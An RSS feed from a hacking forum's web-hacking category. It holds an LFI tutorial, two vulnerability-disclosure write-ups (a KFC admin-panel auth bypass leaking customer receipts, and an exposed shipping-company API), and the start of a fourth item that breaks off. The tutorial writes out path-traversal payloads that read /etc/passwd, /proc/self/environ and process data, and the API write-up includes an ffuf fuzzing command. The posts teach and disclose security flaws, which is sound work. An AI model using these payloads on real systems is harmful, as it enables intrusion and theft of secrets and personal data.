<?xml version="1.0" encoding="UTF-8" ?>
<rss version="2.0" xmlns:discourse="http://www.discourse.org/" xmlns:atom="http://www.w3.org/2005/Atom" xmlns:dc="http://purl.org/dc/elements/1.1/">
  <channel>
    <title>Web Hacking - 0x00sec - The Home of the Hacker</title>
    <link>https://0x00sec.org/c/web-hacking/59</link>
    <description>Topics in the &#39;Web Hacking&#39; category </description>
    
      <lastBuildDate>Sat, 09 Dec 2023 12:54:38 +0000</lastBuildDate>
      <atom:link href="https://0x00sec.org/c/web-hacking/59.rss" rel="self" type="application/rss+xml" />
        <item>
          <title>LFI + /proc shenannigans</title>
          <dc:creator><![CDATA[hatecomputers]]></dc:creator>
          <category>Web Hacking</category>
          <description><![CDATA[
            <p>Yo! Long time no see.  This time i’ll be talking a bit about how to expand your LFI possibilities <img src="https://0x00sec.org/images/emoji/twitter/slight_smile.png?v=12" title=":slight_smile:" class="emoji" alt=":slight_smile:" loading="lazy" width="20" height="20"></p>
<p>Wikipedia defines Local File Inclusion (LFI) as a type of web vulnerability that is most commonly found to affect web applications that rely on a scripting run time. This issue is caused when an application builds a path to executable code using an attacker-controlled variable in a way that allows the attacker to control which file is executed at run time. It’s worth mentioning this vulnerability usually takes advantage of another vulnerability type called Path Traversal, in which an attacker can traverse the directory tree, gaining unauthorized access to file system.</p>
<h2><a name="a-simple-example-1" class="anchor" href="https://0x00sec.org#a-simple-example-1"></a>A simple example</h2>
<p>Imagine the following scenario: While performing an assessment, you come across a web application that allows the user to read logs, providing the ability to properly format outputs as you wish. The user can highlight specific information, exclude rows based on filters, so on and so forth.</p>
<p>By poking with the app, eventually you notice the following request flying over the proxy:</p>
<pre data-code-wrap="http"><code class="lang-plaintext">GET /?filename=10122023.log&amp;v=1 HTTP/1.1

Host: http://app.company.com
Origin: http://app.company.com
...additional headers
</code></pre>
<p>Naturally, you decided to replace <code>10122023.log</code> with something else, maybe something along the lines of <code>test.log</code>. As expected, you get a <code>404</code> response from the server, so you know the application actually did look the file up, it just couldn’t find it. You get all psyched and immediately throw in a <code>../../../../etc/passwd</code> in there, and you get the following response back:</p>
<pre><code class="lang-auto">HTTP/1.1 200 OK

access-control-allow-origin: *
referrer-policy: strict-origin-when-cross-origin
content-type: application/json; charset=utf-8
Server: Express

root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
syslog:x:102:107::/nonexistent:/usr/sbin/nologin
systemd-resolve:x:996:996:systemd Resolver:/:/usr/sbin/nologin
uuidd:x:103:108::/run/uuidd:/usr/sbin/nologin
tss:x:104:109:TPM software stack,,,:/var/lib/tpm:/bin/false
tcpdump:x:105:110::/nonexistent:/usr/sbin/nologin
sshd:x:106:65534::/run/sshd:/usr/sbin/nologin
...
</code></pre>
<p>Jackpot. You are in business.</p>
<p>That’s cool and all, but maybe you want to continue exploiting the application to see how much more you can squeze out of it. Maybe some environment variables? Maybe some hardcoded credentials? The sky is the limit.</p>
<p>The problem is, you put an <code>index.js</code> in there and nothing comes back. You then, try <code>app.js</code>. Also nothing. What? You know it’s a nodejs based app because, being the recon master you are, you couldn’t ignore that <code>Server: Express</code> when first toying around with requests. So as a last resource, you put together a list of possible files and brute force you through just to get to the end of the list with empty hands. WTF did this developer do that he’s not following file naming standards?</p>
<p>So, dead end? You better than that.</p>
<h2><a name="the-proc-directory-2" class="anchor" href="https://0x00sec.org#the-proc-directory-2"></a>The /proc directory</h2>
<p>The /proc directory contains (among other things) one subdirectory for each process running on the system, which is named after the process ID (PID). Consider the following:</p>
<pre><code class="lang-bash">@-box:~$ sleep 20&amp;
@-box:~$ ps -ef | grep "sleep"
user 233322 0.0 0.1 5656 1920 pts/0 S 11:18 0:00 sleep 10
</code></pre>
<p>You call <code>sleep 20</code>, which is gonna hang the process for 20 seconds, while sending it to the background with <code>&amp;</code>. Then, you call <code>ps -ef</code>, which select all processes, while filtering by “sleep”. This gives you the PID which is <code>233322</code>. Now you do:</p>
<pre><code class="lang-sh">@-box:~$ cat /proc/233322/cmdline # and it returns "sleep 20"
</code></pre>
<p>Makes sense?</p>
<p>Another interesting thing is that, this directory has a link to ‘self’, which points to the process currently reading the file system. For instance, if you are sitting on a terminal with your bash session open, and you type <code>cat /proc/self/cmdline</code>, you would get <code>-bash</code> in return, because this, as mentioned before, is the current process reading the file system.</p>
<h2><a name="dumping-the-source-code-3" class="anchor" href="https://0x00sec.org#dumping-the-source-code-3"></a>Dumping the source code</h2>
<p>But going back to the LFI pinnacle: Can you see where we going with this? If you do replace <code>/etc/passwd/</code> with <code>/proc/self/cmdline</code>, you should get the command line arguments that spun the process up, maybe something like <code>node /home/bob/log-app/my-server.js</code>. That would lead you to the entry point file, so you could happily start dumping the source code.</p>
<h2><a name="dumping-environment-variables-4" class="anchor" href="https://0x00sec.org#dumping-environment-variables-4"></a>Dumping environment variables</h2>
<p>'Member when I mentioned environment variables? They usually hold the keys to the castle and having access to it, drastically increases our chances of walking away with something valuable. However, can we get it without achieving a proper RCE? Well, yeah. Turns out, there’s an entry for that too under /proc. All you have to do is setting your payload to <code>/proc/self/environ</code> and whatever environment variables the current process has access to, should be printed out like magic. Isn’t that pretty?</p>
<h2><a name="getting-the-parent-process-id-ppid-5" class="anchor" href="https://0x00sec.org#getting-the-parent-process-id-ppid-5"></a>Getting the parent process ID (PPID)</h2>
<p>There is always a possibility of the application being spawned by another application. In the case of python web apps, for instance, <a href="https://www.uvicorn.org/" rel="noopener nofollow ugc">Uvicorn</a> could be one of the daemons responsible for keeping it up and running. It establishes itself as the parent process in relation to the web application. Having said that, is possible to enumerate that as well, by dumping the file <code>/proc/self/stat</code>. The outcome is similar to what can be seen below:</p>
<pre><code class="lang-auto">164805 (node /home/bob/log-app) S 17612 164805 164805 0 -1 4194304 257091390 30537 33 8 531043 128694 74 67 20 0 11 0 170196020 675442688 11160 18446744073709551615 94626273062912 94626273075221 140735478764848 0 0 0 0 16781312 17922 0 0 0 17 0 0 0 0 0 0 94626273086872 94626273087504 94626292690944 140735478768032 140735478768097 140735478768097 140735478771690 0
</code></pre>
<p>For the purposes of this section, we only care about the <code>17612</code>, as it represents the PPID. Knowing that, you can now go through all the steps we discussed up to this point given the file system is identical regardless of a process being parent or child.</p>
<h2><a name="wrapping-up-6" class="anchor" href="https://0x00sec.org#wrapping-up-6"></a>Wrapping up</h2>
<p>Hope this sheds some light in helping you to level up your LFI game. I obviously would be very much interested in hearing your approach as well, so share away.</p>
<p>See you next time.</p>
<h2><a name="references-7" class="anchor" href="https://0x00sec.org#references-7"></a>References</h2>
<ul>
<li><a href="https://portswigger.net/web-security/file-path-traversal/lab-simple" class="inline-onebox" rel="noopener nofollow ugc">Lab: File path traversal, simple case | Web Security Academy</a></li>
<li><a href="https://docs.kernel.org/filesystems/proc.html" class="inline-onebox" rel="noopener nofollow ugc">The /proc Filesystem — The Linux Kernel documentation</a></li>
</ul>
            <p><small>6 posts - 4 participants</small></p>
            <p><a href="https://0x00sec.org/t/lfi-proc-shenannigans/38264">Read full topic</a></p>
          ]]></description>
          <link>https://0x00sec.org/t/lfi-proc-shenannigans/38264</link>
          <pubDate>Sat, 09 Dec 2023 12:54:38 +0000</pubDate>
          <discourse:topicPinned>No</discourse:topicPinned>
          <discourse:topicClosed>Yes</discourse:topicClosed>
          <discourse:topicArchived>No</discourse:topicArchived>
          <guid isPermaLink="false">0x00sec.org-topic-38264</guid>
          <source url="https://0x00sec.org/t/lfi-proc-shenannigans/38264.rss">LFI + /proc shenannigans</source>
        </item>
        <item>
          <title>Web Vulnerabilities and Disclosure Revelations: Unhealthy Habits</title>
          <dc:creator><![CDATA[vict0ni]]></dc:creator>
          <category>Web Hacking</category>
          <description><![CDATA[
            <p><a href="https://hackersbyrez0.com/"><img src="https://0x00sec.s3.amazonaws.com/original/3X/7/7/777d57dc189c6e9458d468311377857cdd3dc120.jpeg" alt="hackersbyrez0.com" data-base62-sha1="h33mFc7cYFe9qMG0FGtNW8hwteU" width="690" height="386"></a></p>
<p>Fast food chains’ growth <a href="https://www.washingtonpost.com/business/2023/08/14/fast-food-inflation/">has increased by an average of 5.75%</a> in the second quarter of 2023. Covid, the Ukraine-Russia war, and supermarket greediness has tremendously increased the food prices, whereas the fast food prices increase in a much slower pace. This makes it a viable nurturing option for many people, thus increasing the fast food companies’ profits. And I can only assume that some of this profit increase will be invested in the means of production and ways to further increase profits in the long and short term.</p>
<p>When it comes to cybersecurity, one of the biggest fast-food companies, Yum! Brands, was <a href="https://therecord.media/ransomware-attack-hits-nearly-300-fast-food-restaurants-in-uk-including-kfc-and-pizza-hut">hit with ransomware in 2023</a>. It was even reported that <a href="https://www.malwarebytes.com/blog/news/2023/04/kfc-pizza-hut-owner-employee-data-stolen-in-ransomware-attack">employee data were stolen</a> during this attack.</p>
<p>So you can see that, inspite of the profit gain, cybersecurity is still a threat for damage. Of course, such large companies are hard to manage, security-wise. But did they learn from past mistakes?</p>
<h2><a name="kfc-authentication-bypass-and-api-exposure-leaks-millions-of-receipts-with-pii-1" class="anchor" href="https://0x00sec.org#kfc-authentication-bypass-and-api-exposure-leaks-millions-of-receipts-with-pii-1"></a>KFC Authentication Bypass and API Exposure leaks Millions of Receipts with PII</h2>
<p>TLDR:</p>
<ul>
<li>Found a “ordering system” web app while look for food-chain related infra on shodan.</li>
<li>WebApp employed client side checks for authentication, could be easily bypassed by settings a localStorage variable</li>
<li>Led to discovery of a api endpoint which discloses customer phone number, delivery addresses, and order details.</li>
</ul>
<p>This is one of those bugs that you can find without ever leaving the browser, it also highlights the importance of enumerating the UI frameworks (React in this case).</p>
<p>We started with a random search for “KFC” on Shodan, while filtering results through countries, we came across an interesting result on AWS Mumbai, a site seemed to be some sort of order management/administration system.</p>
<p></p><div class="lightbox-wrapper"><a class="lightbox" href="https://0x00sec.s3.amazonaws.com/original/3X/9/e/9eecd7c7d31c8c557afb922bcd8bd08478e78eb5.png" data-download-href="/uploads/short-url/mFUSbe7mdV4TrkNKCDkf11oqMjb.png?dl=1" title="webpage"><img src="https://0x00sec.s3.amazonaws.com/optimized/3X/9/e/9eecd7c7d31c8c557afb922bcd8bd08478e78eb5_2_690x437.png" alt="webpage" data-base62-sha1="mFUSbe7mdV4TrkNKCDkf11oqMjb" width="690" height="437" srcset="https://0x00sec.s3.amazonaws.com/optimized/3X/9/e/9eecd7c7d31c8c557afb922bcd8bd08478e78eb5_2_690x437.png, https://0x00sec.s3.amazonaws.com/optimized/3X/9/e/9eecd7c7d31c8c557afb922bcd8bd08478e78eb5_2_1035x655.png 1.5x, https://0x00sec.s3.amazonaws.com/original/3X/9/e/9eecd7c7d31c8c557afb922bcd8bd08478e78eb5.png 2x" data-dominant-color="6691BA"></a></div><p></p>
<p>First order of business when dealing with a webapp is to pop open devtools and see what we are dealing with, so thats what we did.</p>
<p></p><div class="lightbox-wrapper"><a class="lightbox" href="https://0x00sec.s3.amazonaws.com/original/3X/5/d/5d7391228c9ebbe3d148970956996b9cd5c911b7.png" data-download-href="/uploads/short-url/dkI0m9TkR0nXehA3Jg3JGEECIMn.png?dl=1" title="devtools"><img src="https://0x00sec.s3.amazonaws.com/optimized/3X/5/d/5d7391228c9ebbe3d148970956996b9cd5c911b7_2_690x428.png" alt="devtools" data-base62-sha1="dkI0m9TkR0nXehA3Jg3JGEECIMn" width="690" height="428" srcset="https://0x00sec.s3.amazonaws.com/optimized/3X/5/d/5d7391228c9ebbe3d148970956996b9cd5c911b7_2_690x428.png, https://0x00sec.s3.amazonaws.com/optimized/3X/5/d/5d7391228c9ebbe3d148970956996b9cd5c911b7_2_1035x642.png 1.5x, https://0x00sec.s3.amazonaws.com/optimized/3X/5/d/5d7391228c9ebbe3d148970956996b9cd5c911b7_2_1380x856.png 2x" data-dominant-color="343537"></a></div><p></p>
<p>Luckily we had js source maps, so we didn’t have to read through uglified js code. The imports make it clear that we are dealing with React, the route map gave us a few interesting endpoints to explore.</p>
<p></p><div class="lightbox-wrapper"><a class="lightbox" href="https://0x00sec.s3.amazonaws.com/original/3X/7/0/70ced574aef1165c538278081c82dee28b39b09b.png" data-download-href="/uploads/short-url/g5WCcf31QqvF3Wsusc0B4kIXo9B.png?dl=1" title="routermap"><img src="https://0x00sec.s3.amazonaws.com/optimized/3X/7/0/70ced574aef1165c538278081c82dee28b39b09b_2_690x457.png" alt="routermap" data-base62-sha1="g5WCcf31QqvF3Wsusc0B4kIXo9B" width="690" height="457" srcset="https://0x00sec.s3.amazonaws.com/optimized/3X/7/0/70ced574aef1165c538278081c82dee28b39b09b_2_690x457.png, https://0x00sec.s3.amazonaws.com/optimized/3X/7/0/70ced574aef1165c538278081c82dee28b39b09b_2_1035x685.png 1.5x, https://0x00sec.s3.amazonaws.com/original/3X/7/0/70ced574aef1165c538278081c82dee28b39b09b.png 2x" data-dominant-color="323030"></a></div><p></p>
<p>So we tried visiting <code>/admin</code> directly and were immediately thrown back to the login page. It was time to take a look at that <code>AdminDashComponent</code> the routemap was referring to.</p>
<p></p><div class="lightbox-wrapper"><a class="lightbox" href="https://0x00sec.s3.amazonaws.com/original/3X/e/6/e64ee9fd0dacb6226eaa8f188053ce5b25f6a6d3.png" data-download-href="/uploads/short-url/wRoTdScGhSwOK1b98NQlCmx3pWH.png?dl=1" title="adminComponent"><img src="https://0x00sec.s3.amazonaws.com/optimized/3X/e/6/e64ee9fd0dacb6226eaa8f188053ce5b25f6a6d3_2_557x500.png" alt="adminComponent" data-base62-sha1="wRoTdScGhSwOK1b98NQlCmx3pWH" width="557" height="500" srcset="https://0x00sec.s3.amazonaws.com/optimized/3X/e/6/e64ee9fd0dacb6226eaa8f188053ce5b25f6a6d3_2_557x500.png, https://0x00sec.s3.amazonaws.com/optimized/3X/e/6/e64ee9fd0dacb6226eaa8f188053ce5b25f6a6d3_2_835x750.png 1.5x, https://0x00sec.s3.amazonaws.com/original/3X/e/6/e64ee9fd0dacb6226eaa8f188053ce5b25f6a6d3.png 2x" data-dominant-color="2E2C2C"></a></div><p></p>
<p>All the adminComponent did in the name of authorization was check if a localStorage item “token” exists, we happily set the token manually to a random value.</p>
<p></p><div class="lightbox-wrapper"><a class="lightbox" href="https://0x00sec.s3.amazonaws.com/original/3X/c/e/ce4cdfe1c4cd7d488430dfa8bbbe7a66afb631a1.png" data-download-href="/uploads/short-url/tr13PL5byVwrwlTcWJdNs2Jn6tH.png?dl=1" title="manual-token-set"><img src="https://0x00sec.s3.amazonaws.com/optimized/3X/c/e/ce4cdfe1c4cd7d488430dfa8bbbe7a66afb631a1_2_690x293.png" alt="manual-token-set" data-base62-sha1="tr13PL5byVwrwlTcWJdNs2Jn6tH" width="690" height="293" srcset="https://0x00sec.s3.amazonaws.com/optimized/3X/c/e/ce4cdfe1c4cd7d488430dfa8bbbe7a66afb631a1_2_690x293.png, https://0x00sec.s3.amazonaws.com/optimized/3X/c/e/ce4cdfe1c4cd7d488430dfa8bbbe7a66afb631a1_2_1035x439.png 1.5x, https://0x00sec.s3.amazonaws.com/optimized/3X/c/e/ce4cdfe1c4cd7d488430dfa8bbbe7a66afb631a1_2_1380x586.png 2x" data-dominant-color="2E2C2C"></a></div><p></p>
<p>We now tried visiting <code>/admin</code> and voila!</p>
<p></p><div class="lightbox-wrapper"><a class="lightbox" href="https://0x00sec.s3.amazonaws.com/original/3X/b/d/bd59d7febbfa6c9e92dbecde11e6cf8e5d93288f.png" data-download-href="/uploads/short-url/r14JkOe7XQcez1qgVbhBqOuEzUj.png?dl=1" title="admin-panel"><img src="https://0x00sec.s3.amazonaws.com/optimized/3X/b/d/bd59d7febbfa6c9e92dbecde11e6cf8e5d93288f_2_690x420.png" alt="admin-panel" data-base62-sha1="r14JkOe7XQcez1qgVbhBqOuEzUj" width="690" height="420" srcset="https://0x00sec.s3.amazonaws.com/optimized/3X/b/d/bd59d7febbfa6c9e92dbecde11e6cf8e5d93288f_2_690x420.png, https://0x00sec.s3.amazonaws.com/optimized/3X/b/d/bd59d7febbfa6c9e92dbecde11e6cf8e5d93288f_2_1035x630.png 1.5x, https://0x00sec.s3.amazonaws.com/optimized/3X/b/d/bd59d7febbfa6c9e92dbecde11e6cf8e5d93288f_2_1380x840.png 2x" data-dominant-color="6892BE"></a></div><p></p>
<p>The API was too unstable to get all of the results. With some simple trial and error, we found out that the first entries were from October 30, 2021. We observed that there was an average of 5000 orders per day (more on the weekends, but let’s keep it like this.) From the first day, i.e. 30th of October, until the time of writing (November 8th, 2023) 739 days have passed. This leads to appr. 3.695.000 receipts. Of course, not all of them contain PII. PII could be observed only in delivery receipts, where home addresses, phone numbers, and names were printed out.</p>
<p>Also, when examining the receipts, we came across some interesting delivery addresses and orders, such as a military station.</p>
<p></p><div class="lightbox-wrapper"><a class="lightbox" href="https://0x00sec.s3.amazonaws.com/original/3X/4/7/474827ca69ea922446ce740fb993b3f7b70eb394.png" data-download-href="/uploads/short-url/aaAuxWQAa1l4JKmGi4Hd3zfYstK.png?dl=1" title="mil-st"><img src="https://0x00sec.s3.amazonaws.com/original/3X/4/7/474827ca69ea922446ce740fb993b3f7b70eb394.png" alt="mil-st" data-base62-sha1="aaAuxWQAa1l4JKmGi4Hd3zfYstK" width="620" height="499" data-dominant-color="F5F5F5"></a></div><p></p>
<h2><a name="disclosure-2" class="anchor" href="https://0x00sec.org#disclosure-2"></a>Disclosure</h2>
<p>Both vulnerabilities were reported around the same time through <a href="http://responsibledisclosure.com/">responsibledisclosure.com</a>. We have waited for 90 days to pass, in the hope for both vulnerabilities to be patched.</p>
<p>UPDATE: As of December 2023, both vulnerabilities seem fixed!</p>
            <p><small>4 posts - 3 participants</small></p>
            <p><a href="https://0x00sec.org/t/web-vulnerabilities-and-disclosure-revelations-unhealthy-habits/38206">Read full topic</a></p>
          ]]></description>
          <link>https://0x00sec.org/t/web-vulnerabilities-and-disclosure-revelations-unhealthy-habits/38206</link>
          <pubDate>Mon, 04 Dec 2023 14:58:56 +0000</pubDate>
          <discourse:topicPinned>No</discourse:topicPinned>
          <discourse:topicClosed>Yes</discourse:topicClosed>
          <discourse:topicArchived>No</discourse:topicArchived>
          <guid isPermaLink="false">0x00sec.org-topic-38206</guid>
          <source url="https://0x00sec.org/t/web-vulnerabilities-and-disclosure-revelations-unhealthy-habits/38206.rss">Web Vulnerabilities and Disclosure Revelations: Unhealthy Habits</source>
        </item>
        <item>
          <title>Web Vulnerabilities and Disclosure Revelations: The Ship Has Sailed</title>
          <dc:creator><![CDATA[vict0ni]]></dc:creator>
          <category>Web Hacking</category>
          <description><![CDATA[
            <p></p><div class="lightbox-wrapper"><a class="lightbox" href="https://0x00sec.s3.amazonaws.com/original/3X/3/d/3dd8986b8e50f7fc31a9bd3ba066c537520ada3a.jpeg" data-download-href="/uploads/short-url/8P7b6Mh5Ugj2YPq3w8eD8UL0DxM.jpeg?dl=1" title="hackersbyrez0.com"><img src="https://0x00sec.s3.amazonaws.com/optimized/3X/3/d/3dd8986b8e50f7fc31a9bd3ba066c537520ada3a_2_690x386.jpeg" alt="hackersbyrez0.com" data-base62-sha1="8P7b6Mh5Ugj2YPq3w8eD8UL0DxM" width="690" height="386" srcset="https://0x00sec.s3.amazonaws.com/optimized/3X/3/d/3dd8986b8e50f7fc31a9bd3ba066c537520ada3a_2_690x386.jpeg, https://0x00sec.s3.amazonaws.com/optimized/3X/3/d/3dd8986b8e50f7fc31a9bd3ba066c537520ada3a_2_1035x579.jpeg 1.5x, https://0x00sec.s3.amazonaws.com/optimized/3X/3/d/3dd8986b8e50f7fc31a9bd3ba066c537520ada3a_2_1380x772.jpeg 2x" data-dominant-color="294F70"></a></div><p></p>
<p><em>This is the first article of the series. A pretty cool bug, in my opinion, with a little twist at the end. As we progress, there will be more high- (and low-) profile exposures and issues.</em></p>
<p>Lately, I’ve given a lot of focus on APIs. I’ve been researching ways one can exploit them, discover them, and techniques for better recon. Also, a large amount of my free (and working) hours goes into scanning the Internet for exposed APIs. This writeup is about an API vulnerability (or more like an exposure) I encountered when scanning using Shodan.</p>
<p>The organization is a big European shipping company (and one of the largest in the world) based in Switzerland. The company was hit with an unnamed ransomware some years ago that “brought down its data center for days.” As we will see later, they are still not quite there when it comes to security.</p>
<p>The vulnerable API was (or is?) an exposed internal endpoint that allowed any unauthenticated user to download internal documents regarding the schedules of ships leaving and arriving at ports of a certain European country, as well as the ships’ information, along with documents sent to clients. These documents also exposed email and physical addresses. Also, the API was used for sign-in and signup purposes. Although it was possible to do both, I was unable to find the web application that was utilizing it.</p>
<h2><a name="discovery-1" class="anchor" href="https://0x00sec.org#discovery-1"></a>Discovery</h2>
<p>Although I usually scan for APIs and I then look for vulnerable ones, this time I went specifically after this company. I was sailing one day, when I saw one of their ships and I got intrigued, thinking how cool it would be to be able to say that I reported a vulnerability to this company.</p>
<p>The first thing I usually do is go to Shodan and look for hosts related to a specific target. I once wrote an article on <a href="https://0x00sec.org/t/using-search-engines-for-fun-and-bounties/23832">using search engines for bug bounties and pentesting</a>. To this day, I use the same techniques for passive recon.</p>
<p>A simple-looking Shodan query <code>ssl:"domain.tld" "200 OK"</code> will return all hosts that return a 200 HTTP code and whose SSL certificates are issued for or even just include <code>domain.tld</code>. The results were not that many, so I decided to go through them manually using Shodan’s website.</p>
<p>When manually inspecting hosts, the ones that catch my eye are weird/interesting-looking ones. That means hosts with default front pages, specific products, VPN appliances, test/dev/staging apps, etc. After visiting each interesting-looking host, I encountered one that looked really simple: it included two empty lists to select from and two buttons: “View” and “Download”. The “View” was useless. But the “Download” button was redirecting me to an API endpoint, namely <code>https://blah.domain.tld/api/document/get/download/undefined/0</code>.</p>
<p></p><div class="lightbox-wrapper"><a class="lightbox" href="https://0x00sec.s3.amazonaws.com/original/3X/4/3/43a6e02a43566be74169651d83b808004ff51de1.png" data-download-href="/uploads/short-url/9EtweEla3yoNnV6LOumMaz5lGil.png?dl=1" title="api-undefined"><img src="https://0x00sec.s3.amazonaws.com/optimized/3X/4/3/43a6e02a43566be74169651d83b808004ff51de1_2_690x461.png" alt="api-undefined" data-base62-sha1="9EtweEla3yoNnV6LOumMaz5lGil" width="690" height="461" srcset="https://0x00sec.s3.amazonaws.com/optimized/3X/4/3/43a6e02a43566be74169651d83b808004ff51de1_2_690x461.png, https://0x00sec.s3.amazonaws.com/original/3X/4/3/43a6e02a43566be74169651d83b808004ff51de1.png 1.5x, https://0x00sec.s3.amazonaws.com/original/3X/4/3/43a6e02a43566be74169651d83b808004ff51de1.png 2x" data-dominant-color="1C1B1E"></a></div><p></p>
<h2><a name="internal-documents-authentication-and-surprises-2" class="anchor" href="https://0x00sec.org#internal-documents-authentication-and-surprises-2"></a>Internal documents, authentication, and surprises.</h2>
<p>The undefined part of the URL was causing the API to throw this error. Fuzzing the word <code>undefined</code> with a simple wordlist using <code>ffuf</code>, endpoints with certain numbers were returning some data, e.g.</p>
<ul>
<li><code>https://blah.domain.tld/api/document/get/download/10/0</code></li>
<li><code>https://blah.domain.tld/api/document/get/download/31/0</code></li>
<li><code>https://blah.domain.tld/api/document/get/download/44/0</code></li>
</ul>
<p>etc.</p>
<p>The specific endpoints were returning exactly what the URL says: documents. Each number represented a port and as you can note at the bottom of the PDF, their scope/sensitivity is limited to internal knowledge.</p>
<p></p><div class="lightbox-wrapper"><a class="lightbox" href="https://0x00sec.s3.amazonaws.com/original/3X/4/1/41a3addd9d1ac600ab37066c6ffb31ba5d56e87e.png" data-download-href="/uploads/short-url/9mFIqugajPt6tj9vRZlvxkvr2cS.png?dl=1" title="pdf-sample"><img src="https://0x00sec.s3.amazonaws.com/original/3X/4/1/41a3addd9d1ac600ab37066c6ffb31ba5d56e87e.png" alt="pdf-sample" data-base62-sha1="9mFIqugajPt6tj9vRZlvxkvr2cS" width="653" height="500" data-dominant-color="DCD8A2"></a></div><p></p>
<p>As mentioned, the information in those documents were not credentials or any high-value secrets, but ship schedule and information. That alone doesn’t seem much of a big revelation and maybe it’s not. But you have to take into consideration the nature of the company and what the company itself values as important.</p>
<p>It also appears that the documents are being updated regularly. Three weeks after I discovered the API, the same endpoints were returning different documents. So, after the initial ~30 documents, I ended up with ~60 after one month.</p>
<h3><a name="uknown-authentication-3" class="anchor" href="https://0x00sec.org#uknown-authentication-3"></a>Uknown authentication</h3>
<p>Continuing my API enumeration, I fuzzed for endpoints and found <code>/login</code> and <code>/signup</code>. Of course, those are POST endpoints which required parameters I didn’t have. From my experience, such endpoints require minimum two parameters: username and password. And that was the case for <code>/login</code>. For <code>/signup</code> I had to fuzz for JSON parameters to succeed. For this task, I used BurpSuite’s param-miner and good ol’ ffuf. The ffuf syntax for it was the following (yes, you can fuzz for literally anything with ffuf):</p>
<pre><code class="lang-auto">ffuf -u "https://blah.domain.tld/api/auth/register" -XPOST -H "Content-type: application/json" -d {"username":"testUser","password":"testPassword","FUZZ":"blah"}' -w parameter-wordlist.txt"
</code></pre>
<p>Through the error messages thrown, the size of the response, and some manual inspection the scan yielded the third parameter <code>confirmpassword</code> (which made sense for a signup page tbh).</p>
<p>The signup and login endpoints worked just fine. The login function returned even a JWT signed with the none(!) algorithm. This means that anyone who had a JWT of this app could forge the token and impersonate any registered user. Unfortunately, I was unable to find the web application that was utilizing this API. But this still remains an issue to address internally.</p>
<h3><a name="i-am-not-alone-here-4" class="anchor" href="https://0x00sec.org#i-am-not-alone-here-4"></a>I am not alone here</h3>
<p>While browsing some of the documents I downloaded from the API, I came across some non-PDF files. I displayed them on my terminal</p>
<p></p><div class="lightbox-wrapper"><a class="lightbox" href="https://0x00sec.s3.amazonaws.com/original/3X/2/b/2b72a9493ea203c796dffeed654ea22996e48795.png" data-download-href="/uploads/short-url/6cmbTzkvbvgp3vYlJUhfGhyM3xb.png?dl=1" title="webshell"><img src="https://0x00sec.s3.amazonaws.com/optimized/3X/2/b/2b72a9493ea203c796dffeed654ea22996e48795_2_690x397.png" alt="webshell" data-base62-sha1="6cmbTzkvbvgp3vYlJUhfGhyM3xb" width="690" height="397" srcset="https://0x00sec.s3.amazonaws.com/optimized/3X/2/b/2b72a9493ea203c796dffeed654ea22996e48795_2_690x397.png, https://0x00sec.s3.amazonaws.com/original/3X/2/b/2b72a9493ea203c796dffeed654ea22996e48795.png 1.5x, https://0x00sec.s3.amazonaws.com/original/3X/2/b/2b72a9493ea203c796dffeed654ea22996e48795.png 2x" data-dominant-color="2E2E2E"></a></div><p></p>
<p>and it appears I am not alone here on this quest…</p>
<p>What surprised me (and kind of intruiged me, ngl) the most was the fact that, apparently, there were other, malicious and non-malicious hackers around, poking and exploiting this API. I can assume that other people have notified the company about this issue. Do you think they did something about it?</p>
<h2><a name="vulnerability-disclosure-5" class="anchor" href="https://0x00sec.org#vulnerability-disclosure-5"></a>Vulnerability Disclosure</h2>
<p>With the help of colleagues, I found the email address of their CISO. Also, the PDFs the API was leaking were signed with the name of the author (thank you forensics CTF challenges)</p>
<p><img src="https://0x00sec.s3.amazonaws.com/original/3X/6/2/624b05d7b8de91dcff38e9ab0516b43f3d395958.png" alt="pdfinfo" data-base62-sha1="e1xwIIaFS9T95HthlenlaIsmhTO" width="509" height="366"></p>
<p>I found as many authors I could on LinkedIn and CC’d them to the email I sent to their CISO. The email contained everything I found, i.e. the exposed internal API that:</p>
<ul>
<li>leaks internal documents</li>
<li>allows anyone to login through the API and register into their user database</li>
<li>was already exploited with webshells</li>
</ul>
<p>Two months later, there is still no response to the emails me and my colleagues sent, even though we know they opened theme emails. One would think that after the ransomware hit they would take things like this more seriously and respond. But hey, if they did, I’d be unemployed and/or bored.</p>
            <p><small>13 posts - 9 participants</small></p>
            <p><a href="https://0x00sec.org/t/web-vulnerabilities-and-disclosure-revelations-the-ship-has-sailed/37666">Read full topic</a></p>
          ]]></description>
          <link>https://0x00sec.org/t/web-vulnerabilities-and-disclosure-revelations-the-ship-has-sailed/37666</link>
          <pubDate>Tue, 31 Oct 2023 17:49:11 +0000</pubDate>
          <discourse:topicPinned>No</discourse:topicPinned>
          <discourse:topicClosed>Yes</discourse:topicClosed>
          <discourse:topicArchived>No</discourse:topicArchived>
          <guid isPermaLink="false">0x00sec.org-topic-37666</guid>
          <source url="https://0x00sec.org/t/web-vulnerabilities-and-disclosure-revelations-the-ship-has-sailed/37666.rss">Web Vulnerabilities and Disclosure Revelations: The Ship Has Sailed</source>
        </item>
        <item>
          <title>Series: Web Vulnerabilities and Disclosure Revelations (WVDR)</title>
          <dc:creator><![CDATA[vict0ni]]></dc:creator>
          <category>Web Hacking</category>
          <description><![CDATA[
